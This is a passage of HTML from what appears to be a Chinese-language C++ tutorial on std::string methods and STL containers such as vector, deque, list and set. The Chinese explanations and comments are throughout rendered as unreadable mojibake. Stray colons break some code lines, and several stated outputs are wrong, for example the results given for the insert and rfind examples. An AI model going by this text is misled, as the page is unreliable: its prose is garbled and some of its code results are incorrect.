class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>substr()</code></strong></p><p>ä»å­—ç¬¦ä¸²ä¸­æå–å­ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-built_in">string</span> sub = str.substr(<span class="hljs-number">7</span>, <span class="hljs-number">5</span>);  <span class="hljs-comment">// ä»ç´¢å¼• 7 å¼€å§‹ï¼Œæå– 5 ä¸ªå­—ç¬¦</span><br><span class="hljs-built_in">cout</span> &lt;&lt; sub;  <span class="hljs-comment">// è¾“å‡º &quot;world&quot;</span><br></code></pre></td></tr></table></figure><p> <strong><code>c_str()</code></strong></p><p>å°† <code>std::string</code> è½¬æ¢ä¸º C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå³ä»¥ <code>&#39;\0&#39;</code> ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello&quot;</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* cstr = str.c_str();<br><span class="hljs-built_in">cout</span> &lt;&lt; cstr;  <span class="hljs-comment">// è¾“å‡º &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>c_str()</code> è¿”å›ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²çš„å¸¸é‡æŒ‡é’ˆï¼ˆ<code>const char*</code>ï¼‰ã€‚</li></ul><p><strong><code>append()</code></strong></p><p>å°†å¦ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å­—ç¬¦é™„åŠ åˆ°å½“å‰å­—ç¬¦ä¸²çš„æœ«å°¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello&quot;</span>;<br>str.append(<span class="hljs-string">&quot;, world!&quot;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// è¾“å‡º &quot;Hello, world!&quot;</span><br></code></pre></td></tr></table></figure><p><strong><code>push_back()</code></strong></p><p>å‘å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ ä¸€ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello&quot;</span>;<br>str.push_back(<span class="hljs-string">&#x27;!&#x27;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// è¾“å‡º &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure><p><strong><code>insert()</code></strong></p><p>åœ¨æŒ‡å®šä½ç½®æ’å…¥å­—ç¬¦æˆ–å­å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>str.insert(<span class="hljs-number">5</span>, <span class="hljs-string">&quot;, beautiful&quot;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// è¾“å‡º &quot;Hello, beautiful world!&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>insert(pos, str)</code>ï¼šåœ¨ä½ç½® <code>pos</code> æ’å…¥å­—ç¬¦ä¸² <code>str</code>ã€‚</li><li><code>insert(pos, n, c)</code>ï¼šåœ¨ä½ç½® <code>pos</code> æ’å…¥ <code>n</code> ä¸ªå­—ç¬¦ <code>c</code>ã€‚</li></ul><p> <strong><code>erase()</code></strong></p><p>åˆ é™¤æŒ‡å®šä½ç½®çš„å­—ç¬¦æˆ–å­å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>str.erase(<span class="hljs-number">5</span>, <span class="hljs-number">7</span>);  <span class="hljs-comment">// ä»ç´¢å¼• 5 å¼€å§‹ï¼Œåˆ é™¤ 7 ä¸ªå­—ç¬¦</span><br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// è¾“å‡º &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>erase(pos, len)</code>ï¼šåˆ é™¤ä» <code>pos</code> å¼€å§‹ï¼Œé•¿åº¦ä¸º <code>len</code> çš„å­ä¸²ã€‚</li></ul><p><strong><code>replace()</code></strong></p><p>æ›¿æ¢æŒ‡å®šä½ç½®çš„å­—ç¬¦æˆ–å­å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>str.replace(<span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;C++&quot;</span>);<br>:<span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// è¾“å‡º &quot;Hello, C++!&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>replace(pos, len, str)</code>ï¼šä» <code>pos</code> å¼€å§‹ï¼Œåˆ é™¤ <code>len</code> ä¸ªå­—ç¬¦å¹¶ç”¨ <code>str</code> æ›¿æ¢å®ƒä»¬ã€‚</li></ul><p><strong><code>compare()</code></strong></p><p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°ï¼ˆæŒ‰å­—å…¸åºæ¯”è¾ƒï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str1 = <span class="hljs-string">&quot;apple&quot;</span>;<br><span class="hljs-built_in">string</span> str2 = <span class="hljs-string">&quot;banana&quot;</span>;<br><span class="hljs-type">int</span> result = str1.compare(str2);  <span class="hljs-comment">// è¿”å›è´Ÿå€¼ï¼Œå› ä¸º &quot;apple&quot; å°äº &quot;banana&quot;</span><br><span class="hljs-built_in">cout</span> &lt;&lt; result;  <span class="hljs-comment">// è¾“å‡ºè´Ÿæ•°</span><br></code></pre></td></tr></table></figure><ul><li><code>compare()</code>ï¼šè¿”å›å€¼æ˜¯ <code>0</code> è¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œè´Ÿå€¼è¡¨ç¤ºå½“å‰å­—ç¬¦ä¸²å°äºæ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œæ­£å€¼è¡¨ç¤ºå½“å‰å­—ç¬¦ä¸²å¤§äºæ¯”è¾ƒå­—ç¬¦ä¸²ã€‚</li></ul><p><strong><code>find_first_of()</code></strong></p><p>æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåŒ…å«æŒ‡å®šå­—ç¬¦æˆ–å­—ç¬¦é›†çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-type">size_t</span> pos = str.find_first_of(<span class="hljs-string">&quot;aeiou&quot;</span>);  <span class="hljs-comment">// æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå…ƒéŸ³å­—æ¯çš„ä½ç½®</span><br><span class="hljs-built_in">cout</span> &lt;&lt; pos;  <span class="hljs-comment">// è¾“å‡º 1ï¼Œè¡¨ç¤º &#x27;e&#x27; æ˜¯ç¬¬ä¸€ä¸ªå…ƒéŸ³</span><br></code></pre></td></tr></table></figure><ul><li><code>find_first_of(str)</code>ï¼šè¿”å›ç¬¬ä¸€æ¬¡å‡ºç°å­—ç¬¦é›†ä¸­ä»»æ„å­—ç¬¦çš„ç´¢å¼•ä½ç½®ã€‚</li></ul><p> <strong><code>find_last_of()</code></strong></p><p>æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æœ€åä¸€ä¸ªåŒ…å«æŒ‡å®šå­—ç¬¦æˆ–å­—ç¬¦é›†çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-type">size_t</span> pos = str.find_last_of(<span class="hljs-string">&quot;aeiou&quot;</span>);  <span class="hljs-comment">// æŸ¥æ‰¾æœ€åä¸€ä¸ªå…ƒéŸ³å­—æ¯çš„ä½ç½®</span><br><span class="hljs-built_in">cout</span> &lt;&lt; pos;  <span class="hljs-comment">// è¾“å‡º 8ï¼Œè¡¨ç¤º &#x27;o&#x27; æ˜¯æœ€åä¸€ä¸ªå…ƒéŸ³</span><br></code></pre></td></tr></table></figure><ul><li><code>find_last_of(str)</code>ï¼šè¿”å›æœ€åä¸€æ¬¡å‡ºç°å­—ç¬¦é›†ä¸­çš„ä»»æ„å­—ç¬¦çš„ä½ç½®ã€‚</li></ul><p><strong><code>rfind()</code></strong></p><p>ä»å­—ç¬¦ä¸²çš„å°¾éƒ¨å¼€å§‹æŸ¥æ‰¾æŒ‡å®šå­ä¸²çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world! world!&quot;</span>;<br><span class="hljs-type">size_t</span> pos = str.rfind(<span class="hljs-string">&quot;world&quot;</span>);  <span class="hljs-comment">// æŸ¥æ‰¾æœ€åä¸€æ¬¡å‡ºç° &quot;world&quot; çš„ä½ç½®</span><br><span class="hljs-built_in">cout</span> &lt;&lt; pos;  <span class="hljs-comment">// è¾“å‡º 13</span><br></code></pre></td></tr></table></figure><ul><li><code>rfind(str)</code>ï¼šè¿”å›ä»å°¾éƒ¨å¼€å§‹æŸ¥æ‰¾å­ä¸²çš„ä½ç½®ã€‚</li></ul><p> <strong><code>to_string()</code></strong></p><p>å°†æ•°å­—ç±»å‹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> num = <span class="hljs-number">123</span>;<br><span class="hljs-built_in">string</span> str = <span class="hljs-built_in">std</span>::to_string(num);  <span class="hljs-comment">// &quot;123&quot;</span><br><span class="hljs-built_in">cout</span> &lt;&lt; str;<br></code></pre></td></tr></table></figure><p><strong><code>stoi()</code>, <code>stol()</code>, <code>stof()</code>, <code>stod()</code> ç­‰</strong></p><p>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€é•¿æ•´å‹ã€æµ®ç‚¹æ•°ç­‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;12345&quot;</span>;<br><span class="hljs-type">int</span> num = <span class="hljs-built_in">std</span>::stoi(str);  <span class="hljs-comment">// å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°</span><br><span class="hljs-built_in">cout</span> &lt;&lt; num;  <span class="hljs-comment">// è¾“å‡º 12345</span><br></code></pre></td></tr></table></figure><p> <strong><code>trim()</code> (è‡ªå®šä¹‰å®ç°)</strong></p><p>C++ æ ‡å‡†åº“å¹¶æ²¡æœ‰ç›´æ¥æä¾› <code>trim</code> å‡½æ•°æ¥å»é™¤å­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦ï¼Œä½†ä½ å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°æ¥å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">:<span class="hljs-built_in">string</span> <span class="hljs-title function_">trim</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; str)</span> &#123;<br>    <span class="hljs-keyword">auto</span> start = str.find_first_not_of(<span class="hljs-string">&quot; \t\n\r&quot;</span>);<br>    <span class="hljs-keyword">auto</span> end = str.find_last_not_of(<span class="hljs-string">&quot; \t\n\r&quot;</span>);<br>    <span class="hljs-keyword">return</span> (start == <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos || end == <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) ? <span class="hljs-string">&quot;&quot;</span> : str.substr(start, end - start + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;   Hello, world!   &quot;</span>;<br>   <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; trim(str) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡º &quot;|Hello, world!|&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>++++</p><h3 id="3-å‡½æ•°"><a href="#3-å‡½æ•°" class="headerlink" title="3.å‡½æ•°"></a>3.å‡½æ•°</h3><p>å½“åˆå§‹åŒ–ä¸€ä¸ªéå¼•ç”¨ç±»å‹çš„å˜é‡æ—¶ï¼Œåˆå§‹å€¼è¢«æ‹·è´ç»™å˜é‡ã€‚æ­¤æ—¶ï¼Œå¯¹å˜é‡çš„æ”¹åŠ¨ä¸ä¼šå½±å“åˆå§‹å€¼ã€‚å½“å‡½æ•°çš„å½¢å‚ä¸ºå¼•ç”¨ç±»å‹æ—¶ï¼Œå¯¹å½¢å‚çš„ä¿®æ”¹ä¼šå½±å“å®å‚çš„å€¼ã€‚ä½¿ç”¨å¼•ç”¨çš„ä½œç”¨ï¼šé¿å…æ‹·è´ã€è®©å‡½æ•°è¿”å›é¢å¤–ä¿¡æ¯ã€‚</p><p>++++</p><h3 id="4-STL"><a href="#4-STL" class="headerlink" title="4.STL"></a>4.STL</h3><h4 id="ä¸€-STL-çš„ä¸»è¦ç»„æˆéƒ¨åˆ†"><a href="#ä¸€-STL-çš„ä¸»è¦ç»„æˆéƒ¨åˆ†" class="headerlink" title="ä¸€.STL çš„ä¸»è¦ç»„æˆéƒ¨åˆ†"></a>ä¸€.STL çš„ä¸»è¦ç»„æˆéƒ¨åˆ†</h4><ol><li>å®¹å™¨ ï¼šç”¨æ¥å­˜å‚¨å’Œç®¡ç†æ•°æ®çš„é›†åˆã€‚</li><li>ç®—æ³• ï¼šç”¨äºå¯¹æ•°æ®è¿›è¡Œæ“ä½œï¼Œå¦‚æ’åºã€æŸ¥æ‰¾ã€ä¿®æ”¹ç­‰ã€‚</li><li>è¿­ä»£å™¨ï¼šç”¨äºéå†å®¹å™¨ä¸­çš„å…ƒç´ ï¼Œæä¾›ç»Ÿä¸€çš„è®¿é—®æ¥å£ã€‚</li></ol><h4 id="äºŒã€å®¹å™¨-Containers"><a href="#äºŒã€å®¹å™¨-Containers" class="headerlink" title="äºŒã€å®¹å™¨ (Containers)"></a>äºŒã€å®¹å™¨ (Containers)</h4><p>STL å®¹å™¨åˆ†ä¸ºä¸‰ç±»ï¼š<strong>é¡ºåºå®¹å™¨</strong>ã€<strong>å…³è”å®¹å™¨</strong>å’Œ<strong>æ— åºå…³è”å®¹å™¨</strong>ã€‚</p><h5 id="1-é¡ºåºå®¹å™¨"><a href="#1-é¡ºåºå®¹å™¨" class="headerlink" title="1.é¡ºåºå®¹å™¨"></a>1.é¡ºåºå®¹å™¨</h5><p>é¡ºåºå®¹å™¨å­˜å‚¨æ•°æ®æ—¶ï¼Œå…ƒç´ æŒ‰æ’å…¥é¡ºåºæ’åˆ—ï¼Œå¸¸è§çš„é¡ºåºå®¹å™¨æœ‰ï¼š</p><ul><li><code>vector</code>ï¼šåŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒå¿«é€Ÿéšæœºè®¿é—®ã€‚</li><li><code>deque</code>ï¼šåŒç«¯é˜Ÿåˆ—ï¼Œæ”¯æŒä¸¤ç«¯å¿«é€Ÿæ’å…¥å’Œåˆ é™¤ã€‚</li><li><code>list</code>ï¼šåŒå‘é“¾è¡¨ï¼Œæ”¯æŒåŒå‘éå†ï¼Œæ’å…¥å’Œåˆ é™¤æ“ä½œæ•ˆç‡è¾ƒé«˜ã€‚</li><li><code>array</code>ï¼šå®šé•¿æ•°ç»„ï¼ˆC++11 å¼•å…¥ï¼‰ï¼Œå­˜å‚¨å›ºå®šå¤§å°çš„æ•°æ®ã€‚</li><li><code>forward_list</code>ï¼šå•å‘é“¾è¡¨ï¼ˆC++11 å¼•å…¥ï¼‰ï¼Œæ”¯æŒå•å‘éå†ã€‚</li></ul><p><strong><code>vector</code></strong> åŠ¨æ€æ•°ç»„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;  <span class="hljs-comment">// åˆå§‹åŒ–</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">vec</span><span class="hljs-params">(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º 5ï¼Œå€¼ä¸º 0 çš„ vector</span><br><br><br><br>vec.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);  <span class="hljs-comment">// å°¾éƒ¨æ·»åŠ å…ƒç´ </span><br><span class="hljs-type">bool</span> isEmpty = vec.<span class="hljs-built_in">empty</span>();  <span class="hljs-comment">// è¿”å› true å¦‚æœ vector ä¸ºç©º</span><br><span class="hljs-type">int</span> n = vec.<span class="hljs-built_in">size</span>();<br>vec.<span class="hljs-built_in">pop_back</span>();<br>vec.<span class="hljs-built_in">clear</span>();<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">matrix</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>));<br>matrix.<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>&#125;);  <span class="hljs-comment">// æ·»åŠ æ–°çš„ä¸€è¡Œ</span><br><br>vec.<span class="hljs-built_in">resize</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// æ”¹å˜ `vec` çš„å¤§å°ä¸º 10ï¼Œæ–°å¢çš„å…ƒç´ åˆå§‹åŒ–ä¸º 0</span><br><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>vec.<span class="hljs-built_in">insert</span>(vec.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">// åœ¨ç¬¬ä¸‰ä¸ªä½ç½®æ’å…¥ 3ï¼Œå˜ä¸º &#123;1, 2, 3, 4, 5&#125;</span><br><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>vec.<span class="hljs-built_in">erase</span>(vec.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">2</span>);  <span class="hljs-comment">// åˆ é™¤ç¬¬ä¸‰ä¸ªå…ƒç´ ï¼Œå˜ä¸º &#123;1, 2, 4, 5&#125;</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (it != vec.<span class="hljs-built_in">end</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Found 3 at index: &quot;</span> &lt;&lt; std::<span class="hljs-built_in">distance</span>(vec.<span class="hljs-built_in">begin</span>(), it) &lt;&lt; std::endl;<br>&#125;<br><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// å‡åºæ’åº</span><br><span class="hljs-built_in">reverse</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// å˜ä¸º &#123;5, 4, 3, 2, 1&#125;</span><br><span class="hljs-type">int</span> sum = std::<span class="hljs-built_in">accumulate</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);  <span class="hljs-comment">// è®¡ç®—å’Œï¼Œç»“æœæ˜¯ 15</span><br><br>vec.<span class="hljs-built_in">reserve</span>(<span class="hljs-number">1000</span>);  <span class="hljs-comment">// é¢„åˆ†é…ç©ºé—´ï¼Œé¿å…æ‰©å®¹</span><br></code></pre></td></tr></table></figure><p><strong><code>deque</code></strong> åŒç«¯é˜Ÿåˆ—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">deque</span>&lt;<span class="hljs-type">int</span>&gt; dq = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>dq.push_front(<span class="hljs-number">0</span>);  <span class="hljs-comment">// åœ¨å¤´éƒ¨æ’å…¥å…ƒç´ </span><br>dq.push_back(<span class="hljs-number">4</span>);   <span class="hljs-comment">// åœ¨å°¾éƒ¨æ’å…¥å…ƒç´ </span><br>dq.pop_front();    <span class="hljs-comment">// ç§»é™¤å¤´éƒ¨å…ƒç´ </span><br>dq.pop_back();     <span class="hljs-comment">// ç§»é™¤å°¾éƒ¨å…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : dq) &#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š2 3</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>list</code></strong> åŒå‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">list</span>&lt;<span class="hljs-type">int</span>&gt; lst = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>lst.push_front(<span class="hljs-number">0</span>);  <span class="hljs-comment">// åœ¨å¤´éƒ¨æ’å…¥</span><br>lst.push_back(<span class="hljs-number">4</span>);   <span class="hljs-comment">// åœ¨å°¾éƒ¨æ’å…¥</span><br>lst.remove(<span class="hljs-number">2</span>);      <span class="hljs-comment">// ç§»é™¤å€¼ä¸º2çš„å…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : lst) &#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š0 1 3 4</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-å…³è”å®¹å™¨"><a href="#2-å…³è”å®¹å™¨" class="headerlink" title="2. å…³è”å®¹å™¨"></a>2. <strong>å…³è”å®¹å™¨</strong></h5><p>å…³è”å®¹å™¨åŸºäºå¹³è¡¡äºŒå‰æ ‘ï¼ˆé€šå¸¸æ˜¯çº¢é»‘æ ‘ï¼‰å®ç°ï¼Œå…ƒç´ æŒ‰é”®å€¼æ’åºï¼Œæ”¯æŒå¿«é€ŸæŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤æ“ä½œã€‚å¸¸è§çš„å…³è”å®¹å™¨æœ‰ï¼š</p><ul><li><code>set</code>ï¼šå­˜å‚¨å”¯ä¸€çš„å…ƒç´ ï¼Œè‡ªåŠ¨æŒ‰å…ƒç´ çš„é”®å€¼æ’åºã€‚</li><li><code>map</code>ï¼šé”®å€¼å¯¹ï¼ˆkey-valueï¼‰å½¢å¼å­˜å‚¨å…ƒç´ ï¼ŒæŒ‰é”®æ’åºã€‚</li><li><code>multiset</code>ï¼šå­˜å‚¨å…è®¸é‡å¤çš„å…ƒç´ ï¼ŒæŒ‰é”®æ’åºã€‚</li><li><code>multimap</code>ï¼šå­˜å‚¨å…è®¸é‡å¤çš„é”®å€¼å¯¹ï¼ŒæŒ‰é”®æ’åºã€‚</li></ul><p><strong><code>set</code></strong> å­˜å‚¨å”¯ä¸€å…ƒç´ ï¼Œè‡ªåŠ¨æ’åº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; s = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;  <span class="hljs-comment">// è‡ªåŠ¨æ’åºï¼Œé‡å¤å…ƒç´ è¢«å¿½ç•¥</span><br>s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">5</span>);  <span class="hljs-comment">// æ’å…¥æ–°å…ƒç´ </span><br><br><span class="hljs-comment">// è¾“å‡º set ä¸­çš„å…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span>&amp; x : s) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, 